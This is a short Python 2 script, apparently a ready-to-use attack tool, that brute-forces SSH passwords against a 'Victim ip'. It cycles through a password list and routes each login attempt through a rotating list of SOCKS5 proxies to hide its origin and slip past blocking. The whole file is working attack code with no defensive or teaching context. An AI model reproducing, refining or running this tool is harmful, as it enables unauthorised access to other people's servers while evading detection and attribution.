ssh-bruteforce-throug-proxy

#!/usr/bin/env python

## Usage: ./joder.py <Victim ip> 22 queloco pass.txt proxies.txt

import sys, paramiko, warnings, os
import socket, socks, urllib2

def request(proxy, p_proxy, password):

########################## Use the proxy
        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxy, p_proxy)
        socket.socket = socks.socksocket
###########################

        warnings.filterwarnings(action='ignore',module='.*paramiko.*')

        hostname = sys.argv[1]
        port = sys.argv[2]
        username = sys.argv[3]

        try:
            client = paramiko.SSHClient()
            client.load_system_host_keys()
            client.set_missing_host_key_policy(paramiko.WarningPolicy)
            client.connect(hostname, port=port, username=username, password=password, timeout=10)
            print "Success"
        except Exception as e:
           if 'Authentication failed.' in e:
                print "Failed"
           else:
                print "ERROR"
                no_done.write(password + "\n")


no_done = open("no_done.txt", "w+")

pass_file = open(sys.argv[4])
lines_pass = pass_file.readlines()

script = "cat " + sys.argv[4] + "| wc -l"
leng_pass = os.popen(script).read() #### Get number of passwords
script = "cat " + sys.argv[5] + "| wc -l"
leng_proxy = os.popen(script).read() #### Get number of proxies

proxy_file = open(sys.argv[5])
lines_proxy = proxy_file.readlines()
proxy_pos = 0

for pos in range(0,int(leng_pass)):

    if proxy_pos >= int(leng_proxy):
        proxy_pos = 0
    proxy = (lines_proxy[proxy_pos]).rstrip()
    ip_proxy = proxy.split()[0]
    port_proxy = int(proxy.split()[1])
    proxy_pos = proxy_pos + 1
    password = (lines_pass[pos]).rstrip()


    request(ip_proxy, port_proxy, password)
